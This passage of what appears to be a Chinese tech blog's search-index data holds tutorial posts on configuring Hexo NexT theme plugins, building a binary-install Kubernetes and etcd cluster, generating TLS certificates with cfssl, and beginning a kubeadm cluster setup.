window.setTimeout("siteTime(openOnPC, start)", 1000); var seconds = 1000; var minutes = seconds * 60; var hours = minutes * 60; var days = hours * 24; var years = days * 365; {%- if theme.runtime.start %} start = new Date("{{ theme.runtime.start }}"); {%- endif %} var now = new Date(); var year = now.getFullYear(); var month = now.getMonth() + 1; var date = now.getDate(); var hour = now.getHours(); var minute = now.getMinutes(); var second = now.getSeconds(); var diff = now - start; var diffYears = Math.floor(diff / years); var diffDays = Math.floor((diff / days) - diffYears * 365); var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours); var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes); var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds); if (openOnPC) { document.getElementById("runtime").innerHTML = "Running: " + diffYears + " years " + diffDays + " days " + diffHours + " hours " + diffMinutes + " mins " + diffSeconds + " secs"; } else { document.getElementById("runtime").innerHTML = "Running: " + diffYears + "y " + diffDays + "d " + diffHours + "h " + diffMinutes + "m " + diffSeconds + "s"; } } var showOnMobile = {{ theme.runtime.mobile }}; var openOnPC = isPC(); var start = new Date(); siteTime(openOnPC, start); if (!openOnPC &amp;&amp; !showOnMobile) { document.getElementById(\'site-runtime\').style.display = \'none\'; }&lt;/script&gt; 编辑源文件 themes/next/layout/_partials/footer.swig，在文件末尾添加如下内容 123{%- if theme.runtime.enable %} {% include \'runtime.swig\' %}{%- endif %} 更改 Next 主题的配置文件 themes/next/_config.yml，添加以下内容 12345678910# Site Runtimeruntime: enable: true # The time of the site started running. If not defined, current time of local time zone will be used. # You can specify the time zone by adding the `+HOURS` or `-HOURS` format time zone. # If not specify the time zone, it will use `+0000` as default. # ex: "2015-06-08 07:24:13 +0800", `+0800` specify that it is the time in the East Eight Time Zone. start: 2019-11-23 09:00:00 +0800 # Whether to show on the mobile side mobile: false Next 安装常用插件标签云插件 Hexo-Tag-Cloud 12345# 进入博客的根目录$ cd ${blog-root}/# 安装标签云插件$ npm install hexo-tag-cloud --save 更改 Next 主题的源文件 themes/next/layout/_macro/sidebar.swig, 然后在最后添加如下内容 123456789101112{% if site.tags.length &gt; 1 %}&lt;script type="text/javascript" charset="utf-8" src="{{ url_for(\'/js/tagcloud.js\') }}"&gt;&lt;/script&gt;&lt;script type="text/javascript" charset="utf-8" src="{{ url_for(\'/js/tagcanvas.js\') }}"&gt;&lt;/script&gt;&lt;div class="widget-wrap"&gt; &lt;h3 class="widget-title"&gt;Tag Cloud&lt;/h3&gt; &lt;div id="myCanvasContainer" class="widget tagcloud"&gt; &lt;canvas width="250" height="250" id="resCanvas" style="width:100%"&gt; {{ list_tags() }} &lt;/canvas&gt; &lt;/div&gt;&lt;/div&gt;{% endif %} hexo-tag-cloud 插件支持自定义标签云的字体、颜色和高亮显示，在博客的根目录里，找到 _config.yml 文件，然后添加如下的配置项 1234567tag_cloud: textFont: Trebuchet MS, Helvetica # 字体 textColor: \'#333\' # 字体颜色 textHeight: 25 # 字体大小 outlineColor: \'#E2E1D1\' maxSpeed: 0.5 # 旋转速度 pauseOnSelected: false # 当选中对应标签时，是否停止转动 完成安装和配置后，可以通过以下命令来进行本地预览，其中 hexo clean 为必须选项 1$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s 本地搜索插件Next 主题默认支持使用 Hexo-Generator-Searchdb 插件来实现本地搜索，前提是需要手动安装对应的插件 12345# 进入博客的根目录$ cd ${blog-root}/# 安装搜索插件$ npm install hexo-generator-searchdb --save 在博客的根目录里，找到 _config.yml 文件，然后添加如下的配置项 123456search: path: search.xml field: post content: true format: html limit: 1000 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123456local_search: enable: true trigger: auto top_n_per_article: 1 unescape: false preload: false RSS 订阅插件hexo-generator-feed 插件用于在 public 目录下自动生成 atom.xml 文件 12345# 进入博客的根目录$ cd ${blog-root}/# 安装RSS订阅插件$ npm install hexo-generator-feed --save 在博客的根目录里，找到 _config.yml 文件，然后添加如下的配置项 1234567feed: limit: 20 type: atom path: atom.xml order_by: -date content_limit: 140 autodiscovery: true 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12social: RSS: /atom.xml || fa fa-rss 站点地图插件hexo-generator-sitemap 站点地图插件会在 public 目录下自动生成 sitemap.xml 文件 12345# 进入博客的根目录$ cd ${blog-root}/# 安装插件$ npm install hexo-generator-sitemap --save 在博客的根目录里，创建站点地图的模板文件 sitemap_template.xml，将以下内容复制到文件中 12345678910111213&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt; {% for post in posts %} &lt;url&gt; &lt;loc&gt;{{ post.permalink | uriencode }}&lt;/loc&gt; {% if post.updated %} &lt;lastmod&gt;{{ post.updated.toISOString() }}&lt;/lastmod&gt; {% elif post.date %} &lt;lastmod&gt;{{ post.date.toISOString() }}&lt;/lastmod&gt; {% endif %} &lt;/url&gt; {% endfor %}&lt;/urlset&gt; 在博客的根目录里，找到 _config.yml 文件，然后添加如下的配置项 123sitemap: path: sitemap.xml template: ./sitemap_template.xml 字数与阅读时长统计插件Next 主题默认支持使用 hexo-symbols-count-time 插件来统计文章字数和阅读时长，前提是需要手动安装对应的插件 12345678# 进入博客的根目录$ cd ${blog-root}/# 安装依赖$ npm install eslint --save# 安装插件$ npm install hexo-symbols-count-time --save 在博客的根目录里，找到 _config.yml 文件，然后添加如下的配置项 123456symbols_count_time: time: true # 文章阅读时长 symbols: true # 文章字数统计 total_time: true # 站点总阅读时长 total_symbols: true # 站点总字数统计 exclude_codeblock: true # 排除代码字数统计 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1234symbols_count_time: separated_meta: false # 是否另起一行显示（即不和发表时间等同一行显示） item_text_post: true # 首页文章统计数量前是否显示文字描述（本文字数、阅读时长） item_text_total: false # 页面底部统计数量前是否显示文字描述（站点总字数、站点阅读时长） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"Kubernetes 之二基于二进制方式搭建集群",url:"/posts/ccd6f2d4.html",text:'前言软件环境 软件 版本 安装方式 CentOS 7.9 3.10.0-1160.15.2.el7.x86_64 虚拟机 Docker docker-19.03.9 二进制安装包 Kubernetes 1.19 二进制安装包 Etcd 3.4.9 二进制安装包 集群搭建要求搭建 Kubernetes 集群需要满足以下几个条件： 一台或多台机器，建议操作系统 CentOS 7_x86_64 Master 节点的硬件配置：2GB 或更多 RAM，2 个 CPU 或更多 CPU，硬盘 20GB 或更多 Node 节点的硬件配置：4GB 或更多 RAM，4 个 CPU 或更多 CPU，硬盘 40GB 或更多 系统内可以访问外网，需要拉取镜像，如果服务器不能上网，需要提前下载镜像并导入节点 集群中所有机器之间的网络可以互通 禁用 swap 分区 集群服务器规划 Host Name 角色 IP CPU Memory Disk 组件 k8s-master master 192.168.1.109 &gt;= 2C &gt;=2G &gt;=20G kube-apiserver，kube-controller-manager，kube-scheduler，etcd k8s-node1 node 192.168.1.200 &gt;= 4C &gt;=4G &gt;=40G kubelet，kube-proxy，docker，etcd k8s-node2 node 192.168.1.111 &gt;= 4C &gt;=4G &gt;=40G kubelet，kube-proxy，docker，etcd k8s-node3 node 192.168.1.112 &gt;= 4C &gt;=4G &gt;=40G kubelet，kube-proxy，docker，etcd Kubernetes 单 Master 集群搭建系统初始化值得一提的是，以下系统初始化操作必须在所有节点上执行一次，包括 Master 节点与 Node 节点。 关闭防火墙 12345# 临时关闭# systemctl stop firewalld# 永久关闭# systemctl disable firewalld 关闭 selinux 12345# 临时关闭# setenforce 0# 永久关闭# sed -i \'s/enforcing/disabled/\' /etc/selinux/config 关闭 swap 12345# 临时关闭$ swapoff -a# 永久关闭# sed -i \'s/.*swap.*/#&amp;/\' /etc/fstab 系统时间同步 12345# 安装时间同步工具# yum install ntpdate -y# 设置时间同步服务器# ntpdate time.windows.com 将桥接的 IPv4 流量传递到 iptables 的链 1234567# 添加路由规则# vim /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-iptables = 1net.bridge.bridge-nf-call-ip6tables = 1# 配置生效# sysctl --system 设置主机名 1# hostnamectl set-hostname &lt;hostname&gt; 添加 hosts（Master 和各 Node 节点都需要配置） 123456# 添加hosts# vim /etc/hosts192.168.1.109 k8s-master192.168.1.200 k8s-node1192.168.1.111 k8s-node2192.168.1.112 k8s-node3 搭建 Etcd 集群Etcd 是一个分布式键值存储系统，Kubernetes 使用 Etcd 进行数据存储，所以先准备一个 Etcd 系统。为解决 Etcd 单点故障，建议采用集群方式部署，这里使用 3 台机器组建 Etcd 集群，可容忍 1 台机器故障。当然，也可以使用 5 台组建集群，可容忍 2 台机器故障。为了节省机器，这里与 Kubernetes 节点机器复用，也可以独立于 Kubernetes 集群之外部署，只要 api-server 能连接上就行。 CFSSL 生成证书CFSSL 是 CloudFlare 开源的一款 PKI/TLS 工具，包含一个命令行工具和一个用于签名、验证并且捆绑 TLS 证书的 HTTP API 服务，详细使用教程在这里。 安装 CFSSL 12345678910# 二进制方式安装# curl -L https://pkg.cfssl.org/R1.2/cfssl_linux-amd64 -o /usr/local/bin/cfssl# curl -L https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64 -o /usr/local/bin/cfssljson# curl -L https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64 -o /usr/local/bin/cfssl-certinfo# 文件授权# chmod +x /usr/local/bin/cfssl*# 配置环境变量# export PATH=/usr/local/bin:$PATH 创建 CA 证书的配置文件 1234567891011121314151617181920# cat &lt;&lt; EOF | tee ca-config.json{ "signing": { "default": { "expiry": "87600h" }, "profiles": { "www": { "expiry": "87600h", "usages": [ "signing", "key encipherment", "server auth", "client auth" ] } } }}EOF 创建 CA 证书签名的配置文件 123456789101112131415161718192021# cat &lt;&lt; EOF | tee ca-csr.json{ "CN": "etcd ca", "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ], "ca": { "expiry": "87600h" }}EOF 创建 Etcd 证书的配置文件，hosts 字段中的 IP 为所有 Etcd 节点的集群内部通信 IP，为了方便后期扩容，可以多写几个预留的 IP。由于这里的 Etcd 集群节点和 Kubernetes 的集群节点共同安装在不同虚拟机内，所以 IP 列表就是 Kubernetes 集群各节点的 IP 集合。 123456789101112131415161718192021222324# cat &lt;&lt; EOF | tee server-csr.json{ "CN": "etcd", "hosts": [ "192.168.1.109", "192.168.1.200", "192.168.1.111", "192.168.1.112" ], "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ]}EOF 使用自签 CA 签发 Etcd 证书 12345678910111213# 查看目录文件# lsca-config.json ca-csr.json server-csr.json# 生成CA证书# cfssl gencert -initca ca-csr.json | cfssljson -bare ca -# 生成Etcd证书，"-profile" 参数的值必须与 `ca-config.json` 配置文件中的值一致# cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=www server-csr.json | cfssljson -bare server# 查看生成结果# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem server.csr server-csr.json server-key.pem server.pem 部署 Etcd 集群以下操作都是在 Kubernetes 的 Master 节点上执行，完成后会将 Master 节点上生成的所有 Etcd 文件全部拷贝到其他 Node 节点。千万不要在每个 Node 节点都单独执行生成 Etcd 证书的操作，否则 Etcd 集群里的节点可能会因证书不一致而导致集群启动失败。 Master 节点安装 Etcd 服务 1234567891011# 下载安装文件# wget https://github.com/etcd-io/etcd/releases/download/v3.4.9/etcd-v3.4.9-linux-amd64.tar.gz# 创建安装目录# mkdir -p /opt/etcd/{bin,cfg,ssl}# 解压安装文件# tar zxvf etcd-v3.4.9-linux-amd64.tar.gz# 拷贝安装文件# mv etcd-v3.4.9-linux-amd64/{etcd,etcdctl} /opt/etcd/bin/ Master 节点拷贝上面生成的 Etcd 证书 12# 拷贝证书# cp ca.pem ca-key.pem server.pem server-key.pem /opt/etcd/ssl Master 节点创建 Etcd 的配置文件，这里必须根据实际情况更改 Etcd 各节点的 IP、端口、名称 123456789101112131415# 创建Etcd的配置文件# cat &gt; /opt/etcd/cfg/etcd.conf &lt;&lt; EOF#[Member]ETCD_NAME="etcd-1"ETCD_DATA_DIR="/var/lib/etcd/default.etcd"ETCD_LISTEN_PEER_URLS="https://192.168.1.109:2380"ETCD_LISTEN_CLIENT_URLS="https://192.168.1.109:2379"#[Cluster]ETCD_INITIAL_ADVERTISE_PEER_URLS="https://192.168.1.109:2380"ETCD_ADVERTISE_CLIENT_URLS="https://192.168.1.109:2379"ETCD_INITIAL_CLUSTER="etcd-1=https://192.168.1.109:2380,etcd-2=https://192.168.1.200:2380,etcd-3=https://192.168.1.111:2380,etcd-4=https://192.168.1.112:2380"ETCD_INITIAL_CLUSTER_TOKEN="etcd-cluster"ETCD_INITIAL_CLUSTER_STATE="new"EOF 123456789ETCD_NAME：节点名称，集群中唯一ETCDDATADIR：数据目录路径ETCD_LISTEN_PEER_URLS：集群通信监听地址ETCD_LISTEN_CLIENT_URLS：客户端访问监听地址ETCD_INITIAL_ADVERTISE_PEER_URLS：集群通告地址ETCD_ADVERTISE_CLIENT_URLS：客户端通告地址ETCD_INITIAL_CLUSTER：集群节点地址ETCD_INITIAL_CLUSTER_TOKEN：集群 TokenETCD_INITIAL_CLUSTER_STATE：加入集群的当前状态，new 是新集群，existing 表示加入已有集群 Master 节点使用 Systemd 管理 Etcd 服务 1234567891011121314151617181920212223242526272829303132# 创建Etcd服务管理的配置文件# cat &gt; /usr/lib/systemd/system/etcd.service &lt;&lt; EOF[Unit]Description=Etcd ServerAfter=network.targetAfter=network-online.targetWants=network-online.target[Service]Type=notifyEnvironmentFile=/opt/etcd/cfg/etcd.confExecStart=/opt/etcd/bin/etcd \\--cert-file=/opt/etcd/ssl/server.pem \\--key-file=/opt/etcd/ssl/server-key.pem \\--peer-cert-file=/opt/etcd/ssl/server.pem \\--peer-key-file=/opt/etcd/ssl/server-key.pem \\--trusted-ca-file=/opt/etcd/ssl/ca.pem \\--peer-trusted-ca-file=/opt/etcd/ssl/ca.pem \\--logger=zapRestart=alwaysRestartSec=10sLimitNOFILE=65536[Install]WantedBy=multi-user.targetEOF# 更新配置# systemctl daemon-reload# 开机自启动# systemctl enable etcd 拷贝 Kubernetes 的 Master 节点里的所有 Etcd 文件到其他 Node 节点，并在各个 Node 节点里分别配置 Etcd 和设置 Etcd 服务开机自启动 12345678910111213141516# 拷贝Etcd的文件到各个Node节点# scp -r /opt/etcd/ root@k8s-node1:/opt/# scp -r /opt/etcd/ root@k8s-node2:/opt/# scp -r /opt/etcd/ root@k8s-node3:/opt/# 拷贝Etcd服务管理的配置文件到各个Node节点# scp /usr/lib/systemd/system/etcd.service root@k8s-node1:/usr/lib/systemd/system/# scp /usr/lib/systemd/system/etcd.service root@k8s-node2:/usr/lib/systemd/system/# scp /usr/lib/systemd/system/etcd.service root@k8s-node3:/usr/lib/systemd/system/# 在各个Node节点里分别编辑Etcd的配置文件，包括更改当前节点的名称和IP# vim /opt/etcd/cfg/etcd.conf# 在各个Node节点里分别设置Etcd服务开机自启动# systemctl daemon-reload# systemctl enable etcd 启动 Etcd 集群在 Etcd 的多个节点里分别执行以下命令来启动 Etcd 集群，值得一提的是，必须在多个 Etcd 节点里同时执行 systemctl start etcd 命令来启动集群，否则单个 Etcd 节点是无法正常启动的 123456789# 启动Etcd# systemctl start etcd# 查看运行状态# systemctl satus etcd# 查看启动日志# journalctl -u etcd# tail -f 200 /var/log/message 若 Etcd 集群启动失败，可以在各个 Etcd 节点里分别执行以下操作来解决 12345678# 关闭Etcd# systemctl stop etcd# 删除数据目录# rm -rf /var/lib/etcd/default.etcd# 重启Etcd# systemctl start etcd 参考博客 Etcd 集群故障处理 K8S 二进制部署高可用集群（Calico 网络方案） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Kubernetes 创建 TLS 证书",url:"/posts/58887565.html",text:'前言概述Kubernetes 系统的各组件需要使用 TLS 证书对通信进行加密，本文使用 CloudFlare 的 PKI 工具集 cfssl 来生成 Certificate Authority (CA) 和其它证书，使用证书的组件如下： 组件 证书 etcd ca.pem、kubernetes-key.pem、kubernetes.pem kube-apiserver ca.pem、kubernetes-key.pem、kubernetes.pem kubelet ca.pem kube-proxy ca.pem、kube-proxy-key.pem、kube-proxy.pem kubectl ca.pem、admin-key.pem、admin.pem kube-controller-manager ca-key.pem、ca.pem 用于创建证书的 Json 文件在部署 Kubernetes 集群时创建证书会使用到的 Json 文件，里面包含有 Kubernetes 各组件创建证书时使用到的 Json 文件，目录结构如下，点击下载。 12345678910111213141516├── ca│&nbsp;&nbsp; └── ca-config.json├── etcd│&nbsp;&nbsp; └── server-csr.json├── kube-apiserver│&nbsp;&nbsp; └── server-csr.json├── kube-controller-manager│&nbsp;&nbsp; └── kube-controller-manager-csr.json├── kubectl│&nbsp;&nbsp; └── admin-csr.json├── kubelet│&nbsp;&nbsp; └── kubelet.config.json├── kube-proxy│&nbsp;&nbsp; └── kube-proxy-csr.json└── kube-scheduler └── kube-scheduler-csr.json 特别注意：创建证书的操作都是在 Kubernetes 的 Master 节点上执行，证书只需要创建一次即可，以后向 Kubernetes 集群中添加新节点时，只要将对应的证书拷贝到新节点上即可。千万不要在每个 Node 节点都单独执行生成 Etcd 证书的操作，否则 Etcd 集群里的节点可能会因证书不一致而导致集群启动失败。 安装 CFSSLCFSSL 是 CloudFlare 开源的一款 PKI/TLS 工具，包含一个命令行工具和一个用于签名、验证并且捆绑 TLS 证书的 HTTP API 服务，使用 Go 语言编写。 12345678910# 二进制方式安装# curl -L https://pkg.cfssl.org/R1.2/cfssl_linux-amd64 -o /usr/local/bin/cfssl# curl -L https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64 -o /usr/local/bin/cfssljson# curl -L https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64 -o /usr/local/bin/cfssl-certinfo# 文件授权# chmod +x /usr/local/bin/cfssl*# 配置环境变量# export PATH=/usr/local/bin:$PATH 创建 CA 证书创建 CA 证书的配置文件 1234567891011121314151617181920# cat &lt;&lt; EOF | tee ca-config.json{ "signing": { "default": { "expiry": "87600h" }, "profiles": { "kubernetes": { "expiry": "87600h", "usages": [ "signing", "key encipherment", "server auth", "client auth" ] } } }}EOF 123456## 字段说明:expiry : 87600h 表示有效期 10 年；ca-config.json：可以定义多个 profiles，分别指定不同的过期时间、使用场景等参数；后续在签名证书时使用某个 profile；signing：表示该证书可用于签名其它证书；生成的 ca.pem 证书中 CA=TRUE；server auth：表示 client 可以用该 CA 对 server 提供的证书进行验证；client auth：表示 server 可以用该 CA 对 client 提供的证书进行验证； 创建 CA 证书签名的配置文件 123456789101112131415161718192021# cat &lt;&lt; EOF | tee ca-csr.json{ "CN": "kubernetes", "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ], "ca": { "expiry": "87600h" }}EOF 123## 字段说明:"CN"：Common Name，kube-apiserver 从证书中提取该字段作为请求的用户名 (User Name)；浏览器使用该字段验证网站是否合法；"O"：Organization，kube-apiserver 从证书中提取该字段作为请求用户所属的组 (Group)； 创建 CA 证书和私钥 12345678910# 查看目录下的文件# lsca-config.json ca-csr.json# 生成CA证书和私钥# cfssl gencert -initca ca-csr.json | cfssljson -bare ca -# 查看生成结果# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem 创建 Server 证书创建用于生成 Server 证书的 Json 配置文件，如果 hosts 字段不为空，则需要指定授权使用该证书的 IP 或域名列表。由于该证书后续被 Etcd 集群和 Kubernetes 集群使用，所以一般分别指定 Etcd 集群、Kubernetes 集群各 Master、Node 节点的主机 IP 和 Kubernetes 服务 IP（通常是 kube-apiserver 指定的 service-cluster-ip-range 网段的第一个 IP，如 10.254.0.1） 123456789101112131415161718192021222324# cat &lt;&lt; EOF | tee server-csr.json{ "CN": "kubernetes", "hosts": [ "192.168.1.61", "192.168.1.62", "192.168.1.63", "192.168.1.64" ], "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ]}EOF 创建 Server 证书 1234567891011121314# 查看目录下的文件# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem server-csr.json# 创建Server证书，"-profile" 参数的值必须与 `ca-config.json` 配置文件中的值一致# cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes server-csr.json | cfssljson -bare server# 查看生成结果# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem server.csr server-csr.json server-key.pem server.pem# 验证证书# cfssl-certinfo -cert server.pem# openssl x509 -noout -text -in server.pem 参考博客 Kubernetes SSL 证书梳理 Kubernetes 创建 TLS 证书和秘钥 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Kubernetes 之一特性与 Kubeadm 方式搭建集群",url:"/posts/b728042a.html",text:'Kubernetes 概述Kubernetes 简介Kubernetes 是 Google 开源的一个容器编排引擎，简称 K8s，是用 8 代替 8 个字符 ubernete 而成的缩写。Kubernetes 可用于管理云平台中多个主机上的容器化的应用，支持自动化部署、大规模扩缩容、应用容器化管理。在生产环境中部署一个应用程序时，通常要部署该应用的多个实例以便对应用请求进行负载均衡。Kubernetes 提供了应用部署、规划、更新、维护的一种机制。在 Kubernetes 中，可以创建多个容器，每个容器里面运行一个应用实例，然后通过内置的负载均衡策略，实现对这一组应用实例的管理、发现、访问，而这些细节都不需要运维人员去进行复杂的手工配置和处理。 各种部署方式的区别传统的应用部署方式是通过插件或脚本来安装应用，这样做的缺点是应用的运行、配置、管理、所有生存周期将与当前操作系统绑定，这样做并不利于应用的升级更新、回滚等操作；当然也可以通过创建虚拟机的方式来实现某些功能，但是虚拟机非常重，并不利于可移植性。新的方式是通过部署容器方式实现，每个容器之间互相隔离，每个容器有自己的文件系统，容器之间进程不会相互影响，能区分计算资源。相对于虚拟机，容器能够快速部署，由于容器与底层设施、机器文件系统解耦的，所以它能在不同云、不同版本操作系统间进行迁移。容器占用资源少、部署快，每个应用可以被打包成一个容器镜像，每个应用与容器间成一对一关系也使容器有更大优势，使用容器可以在 build 或 release 的阶段，为应用创建容器镜像，因为每个应用不需要与其余的应用堆栈组合，也不依赖于生产环境基础结构，这使得从研发到测试、生产能提供一致环境。类似地，容器比虚拟机轻量、更 “透明”，这更便于监控和管理。 Kubernetes 功能介绍 自动装箱：基于容器对应用运行环境的资源配置要求自动部署应用容器 自我修复：当容器运行失败时，会对容器进行重启；当所部署的 Node 节点有问题时，会对容器进行重新部署和重新调度；当容器未通过监控检查时，会关闭此容器直到容器正常运行时，才会对外提供服务 水平扩展：通过简单的命令、用户 UI 界面或基于 CPU 等资源使用情况，对应用容器进行规模扩大或规模剪裁 服务发现：用户不需使用额外的服务发现机制，就能够基于 Kubernetes 自身能力实现服务发现和负载均衡 滚动更新：可以根据应用的变化，对应用容器运行的应用，进行一次性或批量式更新 版本回退：可以根据应用部署情况，对应用容器运行的应用，进行历史版本即时回退 密钥和配置管理：在不需要重新构建镜像的情况下，可以部署和更新密钥和应用配置，类似热部署 存储编排：自动实现存储系统挂载及应用，这特别对有状态应用实现数据持久化非常重要；存储系统可以来自于本地目录、网络存储（NFS、Gluster、Ceph 等）、公共云存储服务 批处理：提供一次性任务，定时任务，满足批量数据处理和分析的场景 Kubernetes 架构应用部署架构分类 无中心节点架构：GlusterFS 有中心节点架构：HDFS、K8S Kubernetes 集群架构 Kubernetes 集群架构节点角色 Master（主控节点）：Kubernetes 集群控制节点，负责对集群进行调度管理，接受集群外的用户去集群操作请求。Master 由 API Server、Scheduler、ClusterState Store（ETCD 存储系统）和 Controller MangerServer 组成 Scheduler：节点调度，选择 Node 节点来应用部署 API Server：集群统一入口，以 RESTful 接口将数据交给 ETCD 存储系统 Controller MangerServer：处理集群中的常规后台任务，一个资源对应一个控制器 Node（工作节点）：Kubernetes 集群工作节点，负责运行用户业务应用容器，Node 由 Kubelet、Kube-Proxy 和 ContainerRuntime 组成 Kubelet：负责 Pod 对应的容器的创建、启停管理，与 Master 节点协作，实现集群管理的基本功能 Kube-Proxy：提供 Kubernetes 的通信与负载均衡功能的重要组件 Kubernetes 核心概念 Kubernetes 集群搭建集群搭建方式目前生产环境搭建 Kubernetes 集群主要有以下两种方式： Kubeadm：Kubeadm 是一个 Kubernetes 部署工具，提供 kubeadm init 和 kubeadm join 命令，可用于快速搭建 Kubernetes 集群 二进制包：从 Github 下载发行版的二进制包，手动部署每个组件，组成 Kubernetes 集群。Kubeadm 虽然降低部署门槛，但屏蔽了很多细节，遇到问题很难排查。如果想更容易可控，生产环境推荐使用二进制包搭建 Kubernetes 集群，虽然手动部署比较麻烦，但期间可以学习很多工作原理，也利于后期维护 集群搭建要求搭建 Kubernetes 集群需要满足以下几个条件： 一台或多台机器，建议操作系统 CentOS 7.x86_64 Master 节点的硬件配置：2GB 或更多 RAM，2 个 CPU 或更多 CPU，硬盘 20GB 或更多 Node 节点的硬件配置：4GB 或更多 RAM，4 个 CPU 或更多 CPU，硬盘 40GB 或更多 集群中所有机器之间的网络可以互通 系统内可以访问外网，需要拉取镜像 禁用 swap 分区 集群搭建规划Kubernetes 集群搭建规划分为单 Master 集群和多 Master 集群两种，为了提高集群的高可用性，生产环境一般采用后者的规划方案，如下图所示： Kubeadm 方式搭建单 Master 集群搭建目标-（1）在所有节点上安装 Docker 和 kubeadm-（2）部署 Kubernetes Master-（3）部署容器网络插件-（4）部署 Kubernetes Node，将节点加入 Kubernetes 集群中-（5）部署 Dashboard Web 页面，可视化查看 Kubernetes 资源 软件环境 软件 版本 安装方式 CentOS 7.9 3.10.0-1160.15.2.el7.x86_64 虚拟机 Docker docker-ce-18.06.1.ce-3.el7 YUM Kubelet 1.18.0 YUM Kubeadm 1.18.0 YUM Kubectl 1.18.0 YUM Dashboard 2.0.3 Kubernetes 服务器规划 Host Name 角色 IP CPU Memory Disk k8s-master master 192.168.31.61 &gt;= 2C &gt;=2G &gt;=20G k8s-node1 node 192.168.31.62 &gt;= 4C &gt;=4G &gt;=40G k8s-node2 node 192.168.31.63 &gt;= 4C &gt;=4G &gt;=40G k8s-node3 node 192.168.31.64 &gt;= 4C &gt;=4G &gt;=40G 系统初始化值得一提的是，以下系统初始化操作都必须在所有节点上执行一次，重点包括在所有节点里安装 Docker、Kubelet、Kubeadm。这里要求 Kubelet、Kubeadm、Kubectl 的版本与 Docker 的版本互相匹配（兼容），不建议安装最新版本的 Docker，因为 Kubernetes 对最新版的 Docker 兼容不够及时，容易导致 Kubeadm 方式搭建 Kubernetes 集群失败。 关闭防火墙 12345# 临时关闭# systemctl stop firewalld# 永久关闭# systemctl disable firewalld 关闭 selinux 12345# 临时关闭# setenforce 0# 永久关闭# sed -i \'s/enforcing/disabled/\' /etc/selinux/config 关闭 swap 12345# 临时关闭$ swapoff -a# 永久关闭# sed -i \'s/.*swap.*/#&amp;/\' /etc/fstab 系统时间同步 12345# 安装时间同步工具# yum install ntpdate -y# 设置时间同步服务器# ntpdate time.windows.com 安装 Docker，这是由于 Kubernetes 默认的 CRI（容器运行时）为 Docker 1234567891011121314151617181920212223242526# 添加YUM源# wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo# 安装Docker（指定版本号，否则默认安装最新版本）# yum -y install docker-ce-18.06.1.ce-3.el7# 开机自启动Docker# systemctl enable docker# 启动Docker# systemctl start docker# 配置阿里的Docker镜像加速# vim /etc/docker/daemon.json{ "registry-mirrors": ["https://b9pmyelo.mirror.aliyuncs.com"]}# 重启Docker# systemctl restart docker# 查看Docker的版本# docker --version# 查看Docker的安装信息# docker info 安装 